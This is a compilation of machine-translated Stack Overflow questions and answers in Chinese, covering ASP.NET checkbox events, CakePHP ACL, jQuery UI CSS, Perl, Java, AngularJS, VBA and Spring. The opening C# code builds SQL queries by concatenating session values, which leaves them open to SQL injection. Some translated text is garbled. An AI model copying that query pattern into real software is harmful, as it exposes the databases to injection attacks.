            Char[] separator = new Char[] { ',' };
            String[] subsplit = subject.Split(separator);
            int size = subsplit.Length;
            switch (size)
            {
                case 6: subj6.Text = subsplit[5];
                    goto case 5;
                case 5: subj5.Text = subsplit[4];
                    goto case 4;
                case 4: subj4.Text = subsplit[3];
                    goto case 3;
                case 3: subj3.Text = subsplit[2];
                    goto case 2;
                case 2: subj2.Text = subsplit[1];
                    goto case 1;
                case 1: subj1.Text = subsplit[0];
                    break; ;

            }

        }
        protected void Calendar1_DayRender(object sender, DayRenderEventArgs e)
        {
            if (e.Day.IsWeekend)
            {
                e.Cell.BackColor = System.Drawing.Color.DarkBlue;
            }
            else
            {
                e.Cell.BackColor = System.Drawing.Color.LightBlue;
            }
            SelectedDatesCollection dates = Calendar1.SelectedDates;

            DateTime toDay = DateTime.Today;
            string days = toDay.ToLongDateString();

            Labelday.Text = days;
            Char[] separator = new Char[] { ',' };
            String[] split1 = days.Split(separator);
            day = split1[0];
            Session["day"] = Calendar1.SelectedDate.ToShortDateString();
            if (dates.Count > 0)
            {
                Labelday.Text = dates[0].ToLongDateString() + "<br />";
                String temp = Labelday.Text;
                split1 = temp.Split(separator);
                day = split1[0];
            }
            if (!(day.Equals("Saturday") || day.Equals("Sunday")))
            {
                SqlConnection con = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                string cla = Convert.ToString(Session["uclass"]);
                SqlCommand cmd = new SqlCommand("select " + day + " from studtimetable where class = @class ", con);

                con.Open();
                cmd.Parameters.AddWithValue("class", cla);
                SqlDataReader rdr = null;
                String tt = "";
                rdr = cmd.ExecuteReader();
                while (rdr.Read())
                {
                    tt = rdr[day].ToString();
                }
                con.Close();

                split = tt.Split(separator);
                int size = split.Length;
                lbltime.Visible = true;
                Lblsubj.Visible = true;
                Lblatt.Visible = true;
                switch (size)
                {
                    case 16: Label15.Text = split[15];
                        Session["l15"] = Label15.Text;
                        Label14.Text = split[14];
                        CheckBox8.Visible = true;

                        goto case 14;
                    case 14: Label13.Text = split[13];
                        Session["l13"] = Label13.Text;
                        Label12.Text = split[12];
                        CheckBox7.Visible = true;
                        goto case 12;
                    case 12: Label11.Text = split[11];
                        Session["l11"] = Label11.Text;
                        Label10.Text = split[10];
                        CheckBox6.Visible = true;
                        goto case 10;
                    case 10: Label9.Text = split[9];
                        Session["l9"] = Label9.Text;
                        Label8.Text = split[8];
                        CheckBox5.Visible = true;
                        goto case 8;
                    case 8: Label7.Text = split[7];
                        Session["l7"] = Label7.Text;
                        Label6.Text = split[6];
                        CheckBox4.Visible = true;
                        goto case 6;
                    case 6: Label5.Text = split[5];
                        Session["l5"] = Label5.Text;
                        Label4.Text = split[4];
                        CheckBox3.Visible = true;
                        goto case 4;
                    case 4: Label3.Text = split[3];
                        Session["l3"] = Label3.Text;
                        Label2.Text = split[2];
                        CheckBox2.Visible = true;
                        goto case 2;
                    case 2: Label1.Text = split[1];
                        Session["l1"] = Label1.Text;
                        Label0.Text = split[0];
                        CheckBox1.Visible = true;
                        break;

                }

            }
            else
            {
                lbltime.Text = "Enjoy weekend";
                lbltime.Visible = true;
            }
        }
        protected void Calendar1_SelectionChanged(object sender, EventArgs e)
        {

            CheckBox1.Checked = false;

            CheckBox2.Checked = false;

            CheckBox3.Checked = false;

            CheckBox4.Checked = false;

            CheckBox5.Checked = false;

            CheckBox6.Checked = false;

            CheckBox7.Checked = false;

            CheckBox8.Checked = false;
        }

        protected void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox1.Checked == true)
            {
                string sub = Session["l1"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

            }
            else
            {
                Label18.Text = "uncheck";//temporary to check if this block executes
            }
        }

        protected void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {

            if (CheckBox2.Checked == true)
            {
                string sub = Session["l3"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }

        }

        protected void CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox3.Checked == true)
            {
                string sub = Session["l5"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }

        }

        protected void CheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox4.Checked == true)
            {
                string sub = Session["l7"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {

            }

        }

        protected void CheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox5.Checked == true)
            {
                string sub = Session["l9"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }
        }

        protected void CheckBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox6.Checked == true)
            {
                string sub = Session["l11"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }
        }

        protected void CheckBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox7.Checked == true)
            {
                string sub = Session["l13"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }

        }

        protected void CheckBox8_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox8.Checked == true)
            {
                string sub = Session["l15"].ToString();
                string userid = Session["uname"].ToString();
                string date = Session["day"].ToString();
                string tempclass = Session["uclass"].ToString();

                SqlConnection con4 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
                SqlCommand cmd4 = new SqlCommand("insert into " + tempclass + "track values ('" + userid + "','" + sub + "','" + date + "')", con4);
                con4.Open();

                cmd4.ExecuteNonQuery();
                con4.Close();

                //Response.Redirect("tracker.aspx");
            }
            else
            {
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:33:40.233

从 MSDN（[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.checkbox.oncheckedchanged.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.checkbox.oncheckedchanged.aspx)）：

> CheckBox 控件必须在发送到服务器的帖子之间保留一些值，才能使此事件正常工作。确保为此控件启用了视图状态。

当 (html) 复选框未选中并提交表单时，不会将任何值传递回服务器，这就是您需要为此控件启用 ViewState 的原因，因此 ASP.NET 将跟踪状态（选中/未选中）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-02T19:34:45.620

删除 EnableViewState="false" 它应该可以正常工作

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-05T11:04:21.010

谢谢大家的考虑。问题终于解决了。在用户取消选中事件时，checkchanged 方法没有执行，因为 1）在自动回发的情况下，取消选中导致 page_load 方法的执行，这反过来导致 checkbox.visible=false，所以 checkchanged 没有执行，然后日历渲染方法导致 checkbox.visible =true 与前一个状态(viewstate=true) 即检查状态。

特别感谢弗洛雷明和罗兰。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-05-30T07:31:24.663

解决方法：你应该设置-> EnableViewstate = True, ViewStateMode = Enabled, Autopostback = true。就这样。这对我有用。

# cakephp - 在本地开发环境中禁用 CakePHP ACL/ACO 检查

> ID：15772645
> 
> 赞同：2
> 
> 时间：2013-04-02T19:26:42.727
> 
> 标签：cakephp

我试图在我的本地开发环境中禁用 ACL/ACO 检查，因为每次创建新方法或控制器时同步 ACO 表非常耗时。我在弄清楚如何有条件地做到这一点时遇到问题。我在 AppController 中尝试了以下代码，但没有成功：

```
public function beforeFilter() {
    parent::beforeFilter();

    // disable ACL component in local development environments
    if(preg_match('/\.local/',FULL_BASE_URL)){
        unset($this->components['Acl']);
        unset($this->components['Auth']['authorize']);
    }
} 
```

我正在运行 CakePHP 2.x

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T20:21:56.750

您可能可以通过这种方式实现相同的目的：

在您的 app/Config/core.php 中添加配置

```
Configure::write('Auth.enabled', 0); 
```

与“自动检测”您的环境相比，通常首选显式配置。

然后，在您的 AppController 中；

```
public function beforeFilter()
{
    if(0 === Configure::read('Auth.enabled')) {
        $this->Auth->allow();
    }
} 
```

请参阅[公开操作](http://book.cakephp.org/2.0/en/core-libraries/components/authentication.html#making-actions-public)

或者，完全禁用组件：

```
public function beforeFilter()
{
    if(0 === Configure::read('Auth.enabled')) {
        $this->Components->disable('Acl');
        $this->Components->disable('Auth');
    }
} 
```

# desire2learn - Desire2Learn 替换内容中的字符串

> ID：15772647
> 
> 赞同：1
> 
> 时间：2013-04-02T19:26:47.363
> 
> 标签：desire2learn

我知道有一个名为“替换字符串”的函数允许在 D2L 工具[中替换信息。](http://mooreaboutd2l.wordpress.com/2012/03/31/another-great-use-for-replace-strings/)哪些字符串可用，我可以在内容工具中使用它们吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:31:45.230

在 Desire2Learn 内容工具中，替换字符串功能在*保存*时间而不是*呈现*时间进行替换。这限制了内容中替换字符串的适用性。

可用的替换字符串包括：

电子邮件

外部电子邮件

名

内部电子邮件

姓

组织定义ID

有机的

组织名称

组织代码

有机体

单位名称

组织路径

组织类型id

角色代码

角色ID

角色名

用户身份

用户名

# jquery - 了解jquery ui css文件内容

> ID：15772656
> 
> 赞同：0
> 
> 时间：2013-04-02T19:27:15.237
> 
> 标签：jquery, jquery-ui

删除评论后，我在 jquery.ui.theme.css 文件中注意到以下类...

```
 .ui-widget-header {
                  border: 1px solid #aaaaaa;
                  background: #cccccc;
                  color: #222222;
                 font-weight: bold;
                   } 
```

现在我注意到这个类名：

```
 .ui-widget-header .ui-state-default {
               border: 1px solid #d3d3d3;
               background: #e6e6e6;
               font-weight: normal;
               color: #555555;
                  } 
```

.ui-widget-header .ui-state-default 将如何实现？如果 ui-state-default 都实现了，它们会覆盖 ui-widget-header 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:38:15.223

`.ui-widget-header .ui-state-default`规则针对具有 class的元素`ui-state-default` **内**的具有 class 的元素`ui-widget-header`。如果你在同一个元素上实现这两个类：

```
<div class="ui-widget-header ui-state-default"></div> 
```

您只会看到规则`.ui-widget-header`对`div`. 但是，如果您有这样的标记：

```
<div class="ui-widget-header">
   <div class="ui-widget-header ui-state-default"></div>
</div> 
```

您将看到第二条规则对 inner 的影响`div`：第一条规则将被覆盖。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:42:05.160

根据jquery.com

> .ui-widget-header：应用于标题容器的类。将标题容器样式应用于元素及其子文本、链接和图标。
> 
> .ui-state-default：应用于可点击按钮的类元素。将“可点击的默认”容器样式应用于元素及其子文本、链接和图标。

所以

```
.ui-widget-header .ui-state-default {
               border: 1px solid #d3d3d3;
               background: #e6e6e6;
               font-weight: normal;
               color: #555555;
                  } 
```

适用于具有类 .ui-state-default 的可单击按钮状元素，该元素位于具有类 .ui-widget-header 的标头容器内。

# perl - Perl 中的用户参数问题

> ID：15772663
> 
> 赞同：0
> 
> 时间：2013-04-02T19:27:45.697
> 
> 标签：perl

我目前正在尝试获取文本文件的用户参数（通常为 2 个），从文本文件中获取字符、行和单词的数量并将它们显示回来。我的代码目前将它们全部添加在一起，而不是为每个文件单独列出它们。如何根据用户参数列出文件名，以及每个文件的行数、字符数和单词数，而不将它们加在一起？感谢您花时间阅读本文。

```
#!usr/bin/perl -w
use strict;
my $user_files = @ARGV;
chomp($user_files);

my @parts;
my $word_count = 0;
my $total_words = 0;
my $line_count = 0;

foreach my $line (<>)
{
    @parts = split (/\s+/,$line);
    $line_count += (line =~tr/\n//);
    $word_count += length($line) + 1;
    $total_words += scalar(@parts);
}

for(my $i = 0; $i < 1; $i++)
{
    print "File name:",       @ARGV, 
        "\t\t Word Count: ",  $word_count, 
        "\t\t Total words: ", $total_words, 
        "\t\t Total lines: ", $line_count, 
        "\n";

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-03T10:04:15.963

您需要更改两项基本内容才能使其正常工作。

1.  使用`$ARGV`- 当使用跨多个文件读取时`<>`，它包含当前文件的名称
2.  将数据存储在哈希中（即键控`$ARGV`）

在这个示例中，我保留了您的所有计算（但我认为您需要重新考虑其中的一些），并进行了一些其他更改以稍微清理您的代码。

```
#!/usr/bin/perl

use strict;
use warnings; # better than '-w'

my %files; # Store all the data here

# While is better than foreach here as is reads the file one line at a time.
# Each line goes into $_
while (<>) {
    # By default, split splits $_ on whitespace
    my @parts = split;
    # By default, tr/// works on $_
    $files{$ARGV}{line_count} += tr/\n//;
    # I think this calculation is wrong.
    # length() has no relation to word count. And why add 1 to it?
    $files{$ARGV}{word_count} += length($_) + 1;
    # Addition imposes scalar context, no need for the scalar keyword
    $files{$ARGV}{total_words} += @parts;
}

# Print all the information in the hash
foreach (keys %files) {
    print "File name: $_",
        "\t\t Word Count: $files{$_}{word_count}",
        "\t\t Total words: $files{$_}{total_words}",
        "\t\t Total lines: $files{$_}{line_count}",
        "\n";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:34:33.643

这一行：

```
foreach my $line(<>) 
```

正在从 STDIN 获取输入。您需要执行以下操作：

```
for my $file (@user_files) {
     open my $fin, '<', $file or die $!;
     while ( my $line = <$fin> ) {
         # count stuff
     }
     close $fin;
     # print counted stuff
} 
```

另请注意，如果您想将多个文件名作为参数：

```
my $user_files = @ARGV; 
```

只会采用第一个参数。你可能想要：

```
my @user_files = @ARGV; 
```

此外，`chomp`on 一个 arg 是不必要的。

在您的脚本中，您在打印之前计算所有文件。这很好，但您可能希望将该数据存储在数组或散列中。该数据结构可能如下所示：

```
$file_counts = [
    {
        $file_name1 => {
            characters => $characters,
            words      => $words,
            lines      => $lines,
        }
    },
    {
        $file_name2 => {
            characters => $characters,
            words      => $words,
            lines      => $lines,
        }
    },
]; 
```

# java - 在 Java 中读取回车符和换行符

> ID：15772664
> 
> 赞同：0
> 
> 时间：2013-04-02T19:27:52.367
> 
> 标签：java, soap, tcp, stream

我有一个 SOAP XML，它在开始时有一个我编写的自定义标头。我有 TCP/IP 连接，并且收到 Header + SOAP XML。标头末尾有 \r\n\r\n。当我尝试读取套接字时，我使用了 bufferInputstream 并且它具有 readnextline，并且删除了我使用的 \r\n\r\n 这意味着我到达了标题的末尾，因此我无法解码标题正确。是否有一个函数可以忽略回车和换行，并将套接字响应存储在字符串中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T23:06:23.233

只需阅读，直到`line.length() == 0.`这是两个 \r\n 序列之间的那个。行终止符被删除`readLine(),`，它同时处理 \r\n、\n 和 \r 本身作为行终止符。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-02T21:32:53.790

您正在使用基于 LINE 的解析器，因此您的字符串匹配不能扩展到多行。在您的诡计循环中，查找仅包含“\r”（或仅包含“”，如果它也剥离 \r）的单行，这将是标题和内容之间的一个空白行。

# angularjs - 为什么 ng-selected 不能与 ng-repeater 一起使用？

> ID：15772672
> 
> 赞同：3
> 
> 时间：2013-04-02T19:28:16.590
> 
> 标签：angularjs

[为什么这个中继器坏了](http://jsfiddle.net/hDNsm/1/)

```
<select name="quarter" ng-model="Quarter" ng-selected="Quarter" >
    <option ng-repeat="v in [1,2,3,4]" value="{{v}}">Q{{v}}</option>
</select> 
```

[但不是手写方式？](http://jsfiddle.net/hDNsm/2/)

```
<select name="quarter" ng-model="Quarter" ng-change="onQuarterChange()" ng-selected="Quarter">
    <option value="1">Q1</option>
    <option value="2">Q2</option>
    <option value="3">Q3</option>
    <option value="4">Q4</option>
</select> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T19:52:04.433

坚持`ng-options`

```
<div ng-app>
  <h2>Todo</h2>
  <div ng-controller="QuarterController">
    <select name="quarter" ng-model="Quarter" ng-options="obj.value as obj.text for obj in [{'value': 1,'text' : 'Q1'},{'value':2,'text':'Q2'},{'value':3,'text':'Q3'},{'value':4,'text':'Q4'}]">
    </select>
  </div>
</div>

function QuarterController($scope) {
    $scope.Quarter = 2;
} 
```

[http://jsfiddle.net/hDNsm/3/](http://jsfiddle.net/hDNsm/3/)

您不妨在控制器中定义数组

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-10-27T13:40:57.813

注意两点：

1.  'ng-selected' 指令应该写在 'option' 元素上，而不是 'select' 元素上。

2.  'ng-selected' 属性的内容应该是选择选项的条件。一个简单的例子可能是选项的值等于选择模型。

你的代码应该是这样的：

```
<select name="quarter" ng-model="Quarter">
    <option ng-repeat="v in [1,2,3,4]" value="{{v}}" ng-selected="v==Quarter">Q{{v}}</option>
</select> 
```

# cocoa - 选择器 mainFrame 没有已知的类方法

> ID：15772673
> 
> 赞同：0
> 
> 时间：2013-04-02T19:28:21.633
> 
> 标签：cocoa, xcode4, webkit

我确定这是一个菜鸟问题，但我已经阅读了无数类似的问题，但没有找到特定于该错误的解释。因此，我发帖希望能帮助未来的谷歌人。

我想要一个单击按钮（OSX、Cocoa）在 WebKit WebView 中启动一个 URL。我正在使用 AppDelegate 和 AppDelegate.m 中的（样板，适用于所有人）代码是：

```
- (IBAction)goClick:(id)sender {
    [[WebView mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"google.com"]]];
} 
```

编译时错误是**No known class method for selector mainFrame**。

我发现如果我在 AppDelegate.h 中创建了一个 Outlet：

```
@property (nonatomic, retain) IBOutlet WebView *wvOutlet; 
```

它适用于：

```
[[self.wvOutlet mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"google.com"]]]; 
```

所以这一切都适用于 instance( `self.wvOutlet`) 方法，但不适用于`mainFrame`类上的方法`WebView`。

为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T06:27:22.983

看来我把`webView`（一个实例）拼错了`WebView`。

`webView`解决方案：在`AppDelegate.h`文件中声明插座：

```
@property (weak) IBOutlet WebView *webView; 
```

然后你应该能够做到：

```
[[webView mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"google.com"]]]; 
```

免责声明：尚未测试！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:45:28.493

`[WebView mainFrame]`正在尝试调用**类方法** `+mainFrame`。不存在这样的类方法。

`[self.wvOutlet mainFrame]`正在调用**实例方法** `-mainFrame`。这是对的。

# visual-studio - Visual Studio 停止跟踪到 strlen.asm

> ID：15772676
> 
> 赞同：1
> 
> 时间：2013-04-02T19:28:27.710
> 
> 标签：visual-studio, debugging, strlen

如何防止 Visual Studio 跟踪到 strlen() 和其他此类函数？

我有一个源代码行，例如：

```
i = my_function(x, strlen(x)); 
```

当我踏入这行源码时，我不想踏入strlen()，而只想踏入my_function()。有没有办法在我遇到它们时删除它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-25T21:21:56.517

您可以右键单击调试器中的行并选择直接进入 my_function，或者如果调用有多个参数函数调用，您可以从右键菜单中进入您选择的一个。这不会让您自动跳过这些，但它很有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-25T21:42:29.237

假设您的意思是单步调试 Visual Studio 中调试器中的代码。`F10`当您在那条线上时，您应该可以按一下来跳过代码。如果您按`F11`，这将进入代码，这意味着您将进入`strlen()`.

# java - Java NoClassDefFoundError 即使在同一文件夹中的 Jars

> ID：15772677
> 
> 赞同：2
> 
> 时间：2013-04-02T19:28:31.943
> 
> 标签：java, noclassdeffounderror

我创建了一个简单的 Java 程序（1 个包含 main() 的 java 文件），并且我已将所有 Jar 文件包含在与 .class 文件相同的目录中。它给出了 NoClassDefFoundError 消息。

我已经尝试更新 Classpath 以指向该目录，并且我还设置了“-cp”。建议它与 .class 文件位于同一目录中。但是，程序仍然说它找不到类 def。

关于我应该做什么的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:54:34.560

添加一个文件夹会告诉 java 在该文件夹中查找 .class 文件。您不能通过文件夹名称引用 .jar 文件...每个 .jar 文件的路径必须明确列在 CLASS_PATH 中。

[这个问题的答案可能有用](https://stackoverflow.com/questions/524081/bat-file-to-create-java-classpath)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-15T06:39:37.127

当你尝试从命令行运行一个类时，一个 NoClassDefFound 异常通常意味着你的类路径有问题。

您已经明确定义了类路径。您可以通过几种方式做到这一点，但以下方式最不容易出错：

**打开命令外壳并执行以下操作：**

**1.) 设置类路径 = {类文件的路径};{jar 的路径}**

**2.) java com.example.mainclass**

**注意：**即使您的类路径和 jar 路径相同，您也需要明确指定它们。

**注意：**如果您有多个 jar，请将它们放在一个文件夹中，例如 lib 并将其添加到类路径中，例如：{path}/lib/* 这将包括所有 jar，否则您必须单独指定它们。

**参考资料：** [https ://javarevisited.blogspot.com/2011/01/how-classpath-work-in-java.html](https://javarevisited.blogspot.com/2011/01/how-classpath-work-in-java.html)

* * *

## 回答 #3

> 赞同：-5
> 
> 时间：2018-11-18T18:30:55.497

导入以下包：

```
Import java.lang.NoClassDefFoundError; 
```

# vba - 根据单元格值取消隐藏行

> ID：15772686
> 
> 赞同：0
> 
> 时间：2013-04-02T19:28:52.287
> 
> 标签：vba, excel

我的代码有困难。我想要做的是当单元格 D8 中的数字上升时，它将取消隐藏一行块。这是以下代码：

```
Sub Unhide_Rows(ByVal Target As Range)
If Range("D8").Value > 1 Then
    Select Case Target.Value
        Case "2": Rows("17:36").Hidden = True: Rows("10:16").Hidden = False
        Case "3": Rows("21:37").Hidden = True: Rows("10:20").Hidden = False
        Case "4": Rows("25:37").Hidden = True: Rows("10:24").Hidden = False
        Case "5": Rows("29:37").Hidden = True: Rows("10:29").Hidden = False
        Case "6": Rows("33:37").Hidden = True: Rows("10:33").Hidden = False
        Case "7": Rows("10:37").Hidden = False: Rows("55:56").Hidden = True

    End Select
End If
End Sub 
```

我遇到的另一个问题是，当我尝试在 VBA 中运行代码时，它会打开一个宏框并希望我选择一个宏，但我不想将代码连接到宏...？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:56:45.870

这有点猜测，因为我不太确定您的代码示例中的所有变量的用途。

[示例工作簿在这里](https://dl.dropbox.com/u/10316127/Book1.xlsm)

打开 VBA 编辑器 (Alt+F11)

将以下 Sub 插入到模块中（在 VBA 编辑器中，在主菜单中，插入->模块）

![在 vbaeditor 中显示 module1](https://i.stack.imgur.com/42WRO.png)

```
Sub Toggle_Rows()
Dim Sheet As Worksheet: Set Sheet = ThisWorkbook.Worksheets("Sheet1") ' Change Sheet1 to the name of your sheet

    Select Case CStr(Sheet.Range("D8").Value2)
    Case "2"
        Sheet.Rows("17:36").Hidden = True
        Sheet.Rows("10:16").Hidden = False
    Case "3"
        Sheet.Rows("21:37").Hidden = True
        Sheet.Rows("10:20").Hidden = False
    Case "4"
        Sheet.Rows("25:37").Hidden = True
        Sheet.Rows("10:24").Hidden = False
    Case "5"
        Sheet.Rows("29:37").Hidden = True
        Sheet.Rows("10:29").Hidden = False
    Case "6"
        Sheet.Rows("33:37").Hidden = True
        Sheet.Rows("10:33").Hidden = False
    Case "7"
        Sheet.Rows("10:37").Hidden = False
        Sheet.Rows("55:56").Hidden = True
    Case Else
        ' none
    End Select

End Sub 
```

现在在“项目资源管理器”（通常在 VBA 编辑器的左侧）中打开您正在使用的工作表的代码模块（在我的示例中为 Sheet1）添加以下代码。

![在 vbaeditor 中显示 sheet1 代码](https://i.stack.imgur.com/vT6IG.png)

```
Private Sub Worksheet_Change(ByVal Target As Range)

Msgbox Prompt:="Target.Address=" & Target.Address ' remove this line after debugging.

If Target.Address = "$D$8" Then
    Toggle_Rows
End If

End Sub 
```

**更新**

请确保您已将代码复制到正确的模块中！`Worksheet_Change`出于调试目的，我在 sub 中添加了一行。请将其添加到您的代码中，更改其中的值`D8`并告诉我消息框中显示的内容。

**笔记**

我认为您可能已在代码示例中重命名`Worksheet_Change`为`Unhide_Rows`，这是您无法做到的。（你可以，但它不再像以前那样工作了）

此外，没有参数的 Subs 可以从 VBA 代码编辑器运行。带参数的子程序（如您的）不能，因为除非您使用即时窗口或有另一个子程序（不带参数）为您调用它，否则无法指定参数。

```
Sub HelloWorld(ByVal Text As String) ' cant be run directly
    Debug.print "Hello World! " & Text)
End Sub

Sub CallHello() ' can be run directly in the vba editor
    HelloWorld "Im Alive!"
End Sub 
```

您也可以使用即时窗口调用“HelloWorld”。

```
HelloWorld "Im Alive!" (press enter) 
```

**更新 2**

您的滚动条没有触发`Worksheet_Change`事件，我不确定您是否可以让他们这样做。

但是，滚动条有自己的更改事件子。

打开滚动条所在工作表的代码模块（我相信是Sheet2）在左上角的下拉框（其中显示“（一般）”）中，您的滚动条将有一个项目（“ScrollBar1”，除非您重命名它）。选择此项应添加更改事件代码，否则您需要从右侧下拉框中选择“更改”。

像下面这样的代码应该可以工作。

```
Private Sub ScrollBar1_Change()
    Toggle_Rows
End Sub 
```

# java - 在 restTemplate postForObject 中发送序列化的 JSON

> ID：15772690
> 
> 赞同：1
> 
> 时间：2013-04-02T19:29:08.627
> 
> 标签：java, spring, resttemplate

这是交易。

我有一个*postForObject*要发送。在那个*postForObject*中，我必须发送**2 个**对象：

*   **名称为“DATA”**的**JSON**对象（例如：data={"client":"name","id":"3"}）
***   一个名为“ SESSION_TOKEN **”的****字符串**（例如：session_token="abc"）**

 ****我已经尝试了很多方法来做到这一点，但我总是从服务器收到**400 (BAD REQUEST)**，即使在**PHP中与****CURL**使用的方式相同。*（我已经检查了 curl php 脚本发送的参数，并且正是我上面描述的两个）*

 ***所以，这是我的问题：

1.  我如何管理/创建这**2 个**参数**（正在序列化的 JSON）**并通过*postForObject*发送？有人可以**逐步**解释这个过程吗？*（所以我可以很好地理解这个问题，因为我是 Java/Spring 的新手）*

**PS：** *我已经做了多个运行良好的**getForObject**函数。我真的只需要**如何使用****postForObject**传递这些参数（1 个 Json**序列化**和 1 个字符串）。*

 ****--------------------------------------------------**

**更新** *（发送帖子参数现在正在工作）*

我已通过**postForObject成功发送 POST 数据**

只需像这样创建 RestTemplate ：

```
RestTemplate restTemplate = new RestTemplate();

HttpMessageConverter formHttpMessageConverter = new FormHttpMessageConverter();
HttpMessageConverter stringHttpMessageConverternew = new StringHttpMessageConverter(); 
```

并且必须使用**MultiValueMap**创建属性，如下所示：

```
 MultiValueMap<String, String> map = new LinkedMultiValueMap<String, String>();
    map.add("session_token",session_token); 
```

然后，完成，发送**postForObject**是这样的：

```
 restTemplate.getMessageConverters().add(new MappingJacksonHttpMessageConverter());

    String result = restTemplate.postForObject(API_URL + "company/6788/appointment/", map, String.class); 
```

**现在的问题是：**

